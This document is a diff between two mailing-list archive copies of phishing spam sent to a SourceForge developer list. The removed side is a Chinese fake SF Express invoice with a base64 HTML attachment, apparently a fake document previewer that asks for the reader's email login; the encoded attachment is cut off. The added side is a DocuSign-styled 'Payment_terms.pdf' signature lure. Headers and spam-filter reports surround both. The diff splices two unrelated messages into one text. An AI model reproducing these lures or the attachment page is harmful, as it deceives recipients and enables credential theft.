@@ -2,111 +2,113 @@ Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
 X-Original-To: lists+industrypack-devel@lfdr.de
 Delivered-To: lists+industrypack-devel@lfdr.de
 Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
-	by mail.lfdr.de (Postfix) with ESMTPS id DFE1C95903C
-	for <lists+industrypack-devel@lfdr.de>; Wed, 21 Aug 2024 00:07:27 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTPS id 41B83959084
+	for <lists+industrypack-devel@lfdr.de>; Wed, 21 Aug 2024 00:33:10 +0200 (CEST)
 Received: from [127.0.0.1] (helo=sfs-ml-3.v29.lw.sourceforge.com)
 	by sfs-ml-3.v29.lw.sourceforge.com with esmtp (Exim 4.95)
 	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
-	id 1sgX0h-0006IB-08
+	id 1sgXPZ-0006oG-Ku
 	for lists+industrypack-devel@lfdr.de;
-	Tue, 20 Aug 2024 22:07:26 +0000
+	Tue, 20 Aug 2024 22:33:09 +0000
 Received: from [172.30.29.66] (helo=mx.sourceforge.net)
  by sfs-ml-3.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
  TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
- (envelope-from <info@ariamas.com>) id 1sgX0e-0006I3-QS
+ (envelope-from <line@dalahora.com>) id 1sgXPY-0006oA-LD
  for industrypack-devel@lists.sourceforge.net;
- Tue, 20 Aug 2024 22:07:24 +0000
+ Tue, 20 Aug 2024 22:33:08 +0000
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
- d=sourceforge.net; s=x; h=Content-Type:MIME-Version:Message-ID:Date:Subject:
- To:From:Reply-To:Sender:Cc:Content-Transfer-Encoding:Content-ID:
+ d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
+ :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
  Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
  :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
  List-Subscribe:List-Post:List-Owner:List-Archive;
- bh=LEq7GJinpT+JYOLJYBf4aW/QZ9mnLVdvowP4pwAOjXo=; b=boN5Ca0DbPvTzR183PHT8rFbxd
- vCBBcMFB1z1AJ9sIK4z5SzabphG2X3BRNkduNmAih0uQ4j8sTnmcGa0+kuLraaWL2he68jS12/yuj
- x9GUrTKlFs/cnw75R4Pg8SZxE2MpiQbbWbZdRQ+TK2WUwLSpj3Am79OxLndAx4cUDI9k=;
+ bh=CQ7Ot76YdQOuKk3SQAlQzc3R1+yLKczfVugmolTEO90=; b=YRYfbHap71DuJMPdoc4puUF2vy
+ ctckh6XzstPvfL/Hrvv/ROiszjH6OpvrIKNDiAPe/npd60ON8aSE5izNAzFP8+7jj/IoSmz1dzy97
+ EtxQgkoVmkRLjGpZ4CGQe4hWBAVcwMM5l5EToJnHauco+lLgr69Ou7fYYG5DUOcBVVTI=;
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
  ;
- h=Content-Type:MIME-Version:Message-ID:Date:Subject:To:From:Reply-To:Sender
- :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
- Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
+ h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
+ Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
+ :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
  References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
- List-Owner:List-Archive; bh=LEq7GJinpT+JYOLJYBf4aW/QZ9mnLVdvowP4pwAOjXo=; b=i
- ueozQUnUjd4jdDs/KxW/Kho7NPcidbGBne6djeLkWsULYJzkHgtx/+xg8Igema9CFYtfPGQkcSsvN
- NgkjHcR7BwUMlOHWtZZY+wcgNy+NCdK5O9EGM6VPvT25QgG+hyGJhC9i6w4nGySGk8wbejqlaAQ4X
- E2wN8ApPut32a+G4=;
-Received: from cst-prg-230-120.cust.vodafone.cz ([46.135.230.120]
- helo=kohacek.cz) by sfi-mx-2.v28.lw.sourceforge.com with esmtps
- (TLS1.2:ECDHE-RSA-AES128-GCM-SHA256:128) (Exim 4.95)
- id 1sgX0c-0007Aw-K4 for industrypack-devel@lists.sourceforge.net;
- Tue, 20 Aug 2024 22:07:24 +0000
-Received: from ariamas.com (unknown [147.124.212.76])
- (using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
- (No client certificate requested)
- by kohacek.cz (Postfix) with ESMTPSA id E8B075D05022
- for <industrypack-devel@lists.sourceforge.net>;
- Tue, 20 Aug 2024 18:20:04 +0200 (CEST)
-From: =?UTF-8?B?U0blj5HnpaggMQ==?= <info@ariamas.com>
+ List-Owner:List-Archive; bh=CQ7Ot76YdQOuKk3SQAlQzc3R1+yLKczfVugmolTEO90=; b=G
+ Dn4gUavwnsUYH8UF5CxCKENim0udRvuW+GbNL2czbCI117TZCkPospQWfP7K+Zx1R3kPm2P7WNFBn
+ 6VMEq7/jyqT53yuRg8YfJx9S3UGkG+K01RhyyOfUY5KZgRp9YWsMBgXkPPOqYuP9yzshLyrGtkUzg
+ nqOYlm5duSB0weJw=;
+Received: from squad.dalahora.com ([193.25.216.186])
+ by sfi-mx-2.v28.lw.sourceforge.com with esmtps
+ (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
+ id 1sgXPX-0008LN-4t for industrypack-devel@lists.sourceforge.net;
+ Tue, 20 Aug 2024 22:33:07 +0000
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=dalahora.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:Content-Transfer-Encoding;
+ i=line@dalahora.com; bh=sKp0brK/7N/yxrPeX83c/PPNVbs=;
+ b=EUPa1RbceGrEuTazFZJMcMn9jBnVE3Ocj9GZC6+qetMUpRCsla9WZq0IzzoVmtmltu27wC2mIzRY
+ BLbrHuuN+To8RfeWrte/GUu6dkl4KJ0hPXmtcOcN+vA46JgD9TMmCTQ5dbXTGWtWh6N7ROPThbFU
+ 95vqB9eE2CXZNY2lWJi2YLd+3Ntoz+UGnPnFpspEJPehO3x/xBW44Jn6IEU4ktJMRoPJVpLu4RJR
+ gd5TPTF4Sm2NGndWmenFC7IAhFodZECAe7kz8SvQ+oe9vRDMVwJJnwMpmQ2ChFo8ErGT6GLKv1Ol
+ Jdo8NPDbA06WG9yTBeJFJOp5Kgu73dcpObgoRA==
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=dalahora.com;
+ b=p6ZeejtNn8Wn+9OOVzVTansBft1vtkp74Fww0z2Dg+MBPQAR1QNTmJHNXJR5ifqnKKEtz+BpNvsa
+ S76ZQSVfp/y3LRYtiGqmPxxI+rXYLxl0HfPsoqHe1hr7f0p7/xlwpx+EunYgLVMvZGn9HFybCith
+ fnwcjOAPfyDGkLRiNlZ5eUze0BiiQVyFupp0EYDYwSU3DQHi0XinHz43vPBSBQ05FlXPm3ooKT1h
+ p3OwnWoIElSU9JTJTOpuxbxJbC7ps7hAseoSB0jSRQ1OX/eFtDhqimUEHk4H+soqiEnC2V00KbtA
+ uh+OM3IDeB007dI/T9VzgQF58Ip1vf+v/Wa3Fg==;
+From: =?UTF-8?B?RG9jdVNpZ24gfCBSZXZpZXcgdmlhIEUtc2lnbsKp?= <line@dalahora.com>
 To: industrypack-devel@lists.sourceforge.net
-Date: 20 Aug 2024 09:20:08 -0700
-Message-ID: <20240820092007.FD6D9CF3126C7399@ariamas.com>
+Date: 20 Aug 2024 22:30:26 -0700
+Message-ID: <20240820223026.3393F4AFAE8F7197@dalahora.com>
 MIME-Version: 1.0
-Content-Type: multipart/mixed;
- boundary="----=_NextPart_000_0012_B2E189BE.5325CD8A"
-X-MailScanner-ID: E8B075D05022.AD72B
-X-MailScanner: Not scanned: please contact your Internet E-Mail Service
- Provider for details
-X-MailScanner-SpamScore: ss
-X-MailScanner-From: info@ariamas.com
-X-Spam-Status: No
-X-Spam-Score: 1.1 (+)
-X-Spam-Report: Spam detection software, running on the system "util-spamd-2.v13.lw.sourceforge.com",
+X-Spam-Score: 2.0 (++)
+X-Spam-Report: Spam detection software,
+ running on the system "util-spamd-2.v13.lw.sourceforge.com", 
  has NOT identified this incoming email as spam.  The original
  message has been attached to this so you can view it or label
  similar future email.  If you have any questions, see
  the administrator of that system for details.
- 
- Content preview:  SF Express [运单?= industrypack-devel@lists.sourceforge.net
-    [#8395008] [ 此电子发票由SF发票平台交付，邮件由系统自动发送，
-    请勿直接回复 ] 尊敬的客户，您好！ 您的电子发票已成功开具。请检查附件以查看发票。
-    
- 
- Content analysis details:   (1.1 points, 6.0 required)
- 
-  pts rule name              description
+ Content preview: industrypack-devel@lists.sourceforge.net #30862911
+ Payment_terms.pdf
+ - Invoice online document is ready A copy to review via DocuSign Electronic
+ Signature. REVIEW DOCUMENT 
+ Content analysis details:   (2.0 points, 6.0 required)
+ pts rule name              description
  ---- ---------------------- --------------------------------------------------
-  5.0 RCVD_IN_UCE1           RBL: IP Listed in UCEPROTECT Level 1
-                             [46.135.230.120 listed in dnsbl-1.uceprotect.net]
-  0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
-                             blocked.  See
-                             http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
-                              for more information.
-                             [URIs: nocodeform.io]
+ 0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
+ blocked.  See
+ http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
+ for more information. [URIs: dalahora.com]
  -5.0 RCVD_IN_DNSWL_HI       RBL: Sender listed at https://www.dnswl.org/,
-                             high trust
-                             [46.135.230.120 listed in list.dnswl.org]
-  0.0 RCVD_IN_VALIDITY_CERTIFIED_BLOCKED RBL: ADMINISTRATOR NOTICE:
-                             The query to Validity was blocked.  See
-                             https://knowledge.validity.com/hc/en-us/articles/20961730681243
-                              for more information.
-                             [46.135.230.120 listed in sa-accredit.habeas.com]
-  0.0 RCVD_IN_VALIDITY_RPBL_BLOCKED RBL: ADMINISTRATOR NOTICE: The
-                             query to Validity was blocked.  See
-                             https://knowledge.validity.com/hc/en-us/articles/20961730681243
-                              for more information.
-                            [46.135.230.120 listed in bl.score.senderscore.com]
-  0.0 T_SPF_HELO_PERMERROR   SPF: test of HELO record failed (permerror)
-  1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
-  0.0 NUMERIC_HTTP_ADDR      URI: Uses a numeric IP address in URL
-  0.0 HTML_MESSAGE           BODY: HTML included in message
-  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
-  0.0 HTML_FONT_LOW_CONTRAST BODY: HTML font color similar or
-                             identical to background
-  0.0 T_HTML_ATTACH          HTML attachment to bypass scanning?
+ high trust [193.25.216.186 listed in list.dnswl.org]
+ 0.0 RCVD_IN_VALIDITY_CERTIFIED_BLOCKED RBL: ADMINISTRATOR NOTICE:
+ The query to Validity was blocked.  See
+ https://knowledge.validity.com/hc/en-us/articles/20961730681243
+ for more information.
+ [193.25.216.186 listed in sa-accredit.habeas.com]
+ 0.0 RCVD_IN_VALIDITY_RPBL_BLOCKED RBL: ADMINISTRATOR NOTICE: The
+ query to Validity was blocked.  See
+ https://knowledge.validity.com/hc/en-us/articles/20961730681243
+ for more information.
+ [193.25.216.186 listed in bl.score.senderscore.com]
+ -0.0 SPF_PASS               SPF: sender matches SPF record
+ 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
+ 0.0 DATE_IN_FUTURE_06_12   Date: is 6 to 12 hours after Received: date
+ 0.0 HTML_MESSAGE           BODY: HTML included in message
+ 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
+ -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
+ envelope-from domain
+ 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
+ valid
+ -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
+ author's domain
+ -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
+ 5.0 RCVD_IN_MSPIKE_BL      Mailspike blocklisted
  -0.0 T_SCC_BODY_TEXT_LINE   No description available.
-X-Headers-End: 1sgX0c-0007Aw-K4
-Subject: [Industrypack-devel]
- =1?UTF-8?B?44CQ55S15a2Q5Y+R56Wo5Y+356CBOjMwOTQwMjk344CR5oKo5pS25Yiw5LiA5byg5paw55qE55S15a2Q5Y+R56WoIA==?=
+ 2.1 URI_GOOGLE_PROXY       Accessing a blacklisted URI or obscuring source
+ of phish via Google proxy?
+ 0.0 RCVD_IN_MSPIKE_ZBI     No description available.
+X-Headers-End: 1sgXPX-0008LN-4t
+Subject: [Industrypack-devel] Complete #30862911 Payment_terms.pdf
+ Authorization Signature-Updated
 X-BeenThere: industrypack-devel@lists.sourceforge.net
 X-Mailman-Version: 2.1.21
 Precedence: list
@@ -118,271 +120,220 @@ List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
 List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
 List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
  <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
-Reply-To: S-F
+Content-Type: multipart/mixed; boundary="===============8360730660070246810=="
 Errors-To: industrypack-devel-bounces@lists.sourceforge.net
 
-This is a multi-part message in MIME format.
-
-------=_NextPart_000_0012_B2E189BE.5325CD8A
-Content-Type: text/html;
-	charset="iso-8859-1"
+--===============8360730660070246810==
+Content-Type: text/html
 Content-Transfer-Encoding: quoted-printable
 
-<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
-w3.org/TR/html4/loose.dtd">
-
 <HTML><HEAD>
-<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.17037"></HEAD>
-<body style=3D"MARGIN: 0.5em">
-<P></P>
-<P style=3D"FONT-SIZE: 16px; FONT-FAMILY: &#23435;&#20307;,arial,Verdana,sa=
-ns-serif; FONT-VARIANT: normal; WHITE-SPACE: normal; WORD-SPACING: 0px; TEX=
-T-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px=
-; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LET=
-TER-SPACING: normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255)=
-; TEXT-INDENT: 0px" align=3Dcenter>
-<FONT style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MA=
-RGIN: 0px; LINE-HEIGHT: 1.6; PADDING-RIGHT: 0px" size=3D3><BR style=3D"PADD=
-ING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-=
-RIGHT: 0px">&nbsp; &nbsp;</FONT></P>
-<P style=3D"WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; C=
-OLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; FONT: 400 14px/22p=
-x &#24494;&#36719;&#38597;&#40657;; PADDING-LEFT: 0px; MARGIN: 0px; LETTER-=
-SPACING: normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); TE=
-XT-INDENT: 0px"></P>
-<P style=3D'WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; C=
-OLOR: rgb(49,53,59); FONT: 14px/22px Verdana,"Microsoft Yahei",SimSun,sans-=
-serif; LETTER-SPACING: normal; TEXT-INDENT: 0px'></P>
-<P>
-<table style=3D"FONT-SIZE: small; FONT-FAMILY: Arial,Helvetica,sans-serif; =
-FONT-VARIANT: normal; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFOR=
-M: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); PADDING-BOTTOM: 0px; FONT-=
-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LETTER-SPA=
-CING: normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-=
-INDENT: 0px">
-<TBODY style=3D"WHITE-SPACE: normal; PADDING-BOTTOM: 0px; PADDING-TOP: 0px;=
- PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">
-<TR style=3D"WHITE-SPACE: normal; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PA=
-DDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">
-<td style=3D"WHITE-SPACE: normal; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PA=
-DDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" width=3D"30">&nbsp;</TD>
-<td style=3D"WHITE-SPACE: normal; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PA=
-DDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">
-<table style=3D"WHITE-SPACE: normal; PADDING-BOTTOM: 0px; PADDING-TOP: 0px;=
- PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">
-<TBODY style=3D"WHITE-SPACE: normal; PADDING-BOTTOM: 0px; PADDING-TOP: 0px;=
- PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">
-<TR style=3D"WHITE-SPACE: normal; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PA=
-DDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">
-<td style=3D"WHITE-SPACE: normal; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PA=
-DDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">
-<table style=3D"WHITE-SPACE: normal; PADDING-BOTTOM: 0px; PADDING-TOP: 0px;=
- PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; border-radius: 3px" ce=
-llspacing=3D"0" align=3D"center">
-<TBODY style=3D"WHITE-SPACE: normal; PADDING-BOTTOM: 0px; PADDING-TOP: 0px;=
- PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">
-<TR style=3D"WHITE-SPACE: normal; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PA=
-DDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">
-<td style=3D"BORDER-TOP: rgb(255,0,0) 1px solid; HEIGHT: 45px; BORDER-RIGHT=
-: rgb(255,0,0) 1px solid; WIDTH: 115px; WHITE-SPACE: normal; BORDER-BOTTOM:=
- rgb(255,0,0) 1px solid; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEF=
-T: 0px; MARGIN: 0px; BORDER-LEFT: rgb(255,0,0) 1px solid; PADDING-RIGHT: 0p=
-x; BACKGROUND-COLOR: rgb(255,0,0)">
-<DIV style=3D"WHITE-SPACE: normal; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; P=
-ADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" align=3Dcenter><FONT sty=
-le=3D"WHITE-SPACE: normal; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-L=
-EFT: 0px; MARGIN: 0px; LINE-HEIGHT: 1.6; PADDING-RIGHT: 0px" color=3D#fffff=
-f size=3D5 face=3Dcalibri><B style=3D"WHITE-SPACE: normal; PADDING-BOTTOM: =
-0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">=
-SF Express</B></FONT></DIV></TD>
-<td style=3D"BORDER-TOP: rgb(46,46,46) 1px solid; BORDER-RIGHT: rgb(46,46,4=
-6) 1px solid; WIDTH: 10px; WHITE-SPACE: normal; BORDER-BOTTOM: rgb(46,46,46=
-) 1px solid; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARG=
-IN: 0px; BORDER-LEFT: rgb(46,46,46) 1px solid; PADDING-RIGHT: 0px; BACKGROU=
-ND-COLOR: rgb(46,46,46)">&nbsp;</TD>
-<td style=3D"BORDER-TOP: rgb(46,46,46) 1px solid; BORDER-RIGHT: rgb(46,46,4=
-6) 1px solid; WIDTH: 385px; WHITE-SPACE: normal; BORDER-BOTTOM: rgb(46,46,4=
-6) 1px solid; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MAR=
-GIN: 0px; BORDER-LEFT: rgb(46,46,46) 1px solid; PADDING-RIGHT: 0px; BACKGRO=
-UND-COLOR: rgb(46,46,46)">
-<FONT style=3D"WHITE-SPACE: normal; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; =
-PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 1.6; PADDING-RIGHT: 0px" color=
-=3D#ffffff size=3D2 face=3Dcalibri>[&#36816;&#21333;?=3D industrypack-devel=
-@lists.sourceforge.net [#8395008]</FONT></TD></TR>
-<TR style=3D"WHITE-SPACE: normal; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PA=
-DDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px"></TR></TBODY></TABLE></TD=
-></TR></TBODY></TABLE>
-<table style=3D"WHITE-SPACE: normal; PADDING-BOTTOM: 0px; PADDING-TOP: 0px;=
- PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" align=3D"center">
-<TBODY style=3D"WHITE-SPACE: normal; PADDING-BOTTOM: 0px; PADDING-TOP: 0px;=
- PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">
-<TR style=3D"WHITE-SPACE: normal; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PA=
-DDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">
-<td style=3D"BORDER-TOP: rgb(255,0,0) 1px solid; HEIGHT: 300px; BORDER-RIGH=
-T: rgb(255,0,0) 1px solid; WIDTH: 470px; WHITE-SPACE: normal; BORDER-BOTTOM=
-: rgb(255,0,0) 1px solid; PADDING-BOTTOM: 25px; PADDING-TOP: 25px; PADDING-=
-LEFT: 25px; MARGIN: 0px; BORDER-LEFT: rgb(255,0,0) 1px solid; PADDING-RIGHT=
-: 25px; border-radius: 0px 0px 39px"><FONT style=3D"WHITE-SPACE: normal; PA=
-DDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-H=
-EIGHT: 1.6; PADDING-RIGHT: 0px" size=3D2 face=3Dverdana>
-<B style=3D"WHITE-SPACE: normal; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PAD=
-DING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px"><FONT style=3D"WHITE-SPACE=
-: normal; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN:=
- 0px; LINE-HEIGHT: 1.6; PADDING-RIGHT: 0px" color=3D#ff0000 size=3D+1>[ &#2=
-7492;&#30005;&#23376;&#21457;&#31080;&#30001;SF&#21457;&#31080;&#24179;&#21=
-488;&#20132;&#20184;&#65292;&#37038;&#20214;&#30001;&#31995;&#32479;&#33258=
-;&#21160;&#21457;&#36865;&#65292;<WBR>
- &#35831;&#21247;&#30452;&#25509;&#22238;&#22797; ]</FONT></B><SPAN>&nbsp;<=
-/SPAN><BR style=3D"WHITE-SPACE: normal; PADDING-BOTTOM: 0px; PADDING-TOP: 0=
-px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px"><BR style=3D"WHITE-=
-SPACE: normal; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MA=
-RGIN: 0px; PADDING-RIGHT: 0px">&#23562;&#25964;&#30340;&#23458;&#25143;&#65=
-292;&#24744;&#22909;&#65281;</FONT>
- <FONT style=3D"WHITE-SPACE: normal; PADDING-BOTTOM: 0px; PADDING-TOP: 0px;=
- PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 1.6; PADDING-RIGHT: 0px" size=
-=3D2 face=3Dverdana><SPAN>&nbsp;</SPAN><BR style=3D"WHITE-SPACE: normal; PA=
-DDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDIN=
-G-RIGHT: 0px"><BR style=3D"WHITE-SPACE: normal; PADDING-BOTTOM: 0px; PADDIN=
-G-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">
-&#24744;&#30340;&#30005;&#23376;&#21457;&#31080;&#24050;&#25104;&#21151;&#2=
-4320;&#20855;&#12290;&#35831;&#26816;&#26597;&#38468;&#20214;&#20197;&#2659=
-7;&#30475;&#21457;&#31080;&#12290;</FONT><BR style=3D"WHITE-SPACE: normal; =
-PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADD=
-ING-RIGHT: 0px">&nbsp;<SPAN style=3D"WHITE-SPACE: normal">&nbsp;</SPAN><SPA=
-N>&nbsp;</SPAN>
- <BR style=3D"WHITE-SPACE: normal; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; P=
-ADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px"><FONT style=3D"WHITE-SPA=
-CE: normal; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGI=
-N: 0px; LINE-HEIGHT: 1.6; PADDING-RIGHT: 0px" size=3D2 face=3Dverdana>&#229=
-14;&#26524;&#36935;&#21040;&#31080;&#21495;&#26080;&#25928;&#12289;&#21457;=
-&#31080;&#19979;&#36733;&#25171;&#21360;&#12289;&#21457;&#31080;&#20002;&#2=
-2833;&#31561;&#38382;&#39064;&#65292;<WBR>
- &#20063;&#21487;&#20197;&#22312;&#24494;&#20449;&#20844;&#20247;&#21495;&#=
-21672;&#35810;&#12290;<BR style=3D"WHITE-SPACE: normal; PADDING-BOTTOM: 0px=
-; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px"><BR=
- style=3D"WHITE-SPACE: normal; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDI=
-NG-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px"><B style=3D"WHITE-SPACE: nor=
-mal; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px;=
- PADDING-RIGHT: 0px">
-<FONT style=3D"WHITE-SPACE: normal; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; =
-PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 1.6; PADDING-RIGHT: 0px" color=
-=3D#ff0000>[ &#35831;&#22949;&#21892;&#20445;&#31649;&#20197;&#19978;&#2145=
-7;&#31080;&#35201;&#32032;&#20449;&#24687;&#12290;]</FONT></B></FONT></TD><=
-/TR></TBODY></TABLE></TD></TR></TBODY></TABLE></P></BODY></HTML>
-------=_NextPart_000_0012_B2E189BE.5325CD8A
-Content-Type: text/html; name="SF-Purchase orders.html"
-Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="SF-Purchase orders.html"
+<STYLE type=3Dtext/css>
+=2Eauto-style2 {
+	color: #474A87;
+}
+=2Eauto-style3 {
+	font-size: xx-small;
+}
+</STYLE>
 
-PGh0bWw+DQo8aGVhZD4NCgk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9
-ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPg0KCTxtZXRhIGh0dHAtZXF1aXY9Ilgt
-VUEtQ29tcGF0aWJsZSIgY29udGVudD0iSUU9ZWRnZSxjaHJvbWU9MSIgLz4NCgk8dGl0bGU+
-UERGIHwgbGlzdHMuc291cmNlZm9yZ2UubmV0IERvY3VtZW50IFByZXZpZXdlcjwvdGl0bGU+
-DQoJPGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSIuL3Bob3Rvcy9mYXZpY29uLmlj
-byI+DQoJPHN0eWxlPg0KaW5wdXRbdHlwZT1zdWJtaXRdIHsNCiAgd2lkdGg6MTEwcHg7IA0K
-ICBoZWlnaHQ6MzVweDsgDQogIGZvbnQtZmFtaWx5OiB2ZXJkYW5hOyANCiAgZm9udC1zaXpl
-OiAxMnB4OyANCiAgY29sb3I6I0ZGRjsgDQogIGJhY2tncm91bmQtY29sb3I6ICMwNDg5QjE7
-IA0KICBib3JkZXI6IHNvbGlkIDFweCAjMDQ4OUIxOyANCiAgcGFkZGluZzogN3B4OyANCiAg
-LW1vei1ib3JkZXItcmFkaXVzOiA0cHg7IA0KICAtd2Via2l0LWJvcmRlci1yYWRpdXM6IDRw
-eDsgDQogIC1raHRtbC1ib3JkZXItcmFkaXVzOiA0cHg7IA0KICBib3JkZXItcmFkaXVzOiA0
-cHg7DQogIC13ZWJraXQtYm94LXNoYWRvdzogMXB4IDFweCAxMHB4IDNweCAjRkZGOyANCiAg
-Ym94LXNoYWRvdzogMXB4IDFweCAxMHB4IDNweCAjRkZGOw0KfQ0KDQppbnB1dFt0eXBlPWVt
-YWlsXSB7DQogIHdpZHRoOjI3NXB4OyANCiAgaGVpZ2h0OjM1cHg7IA0KICBmb250LWZhbWls
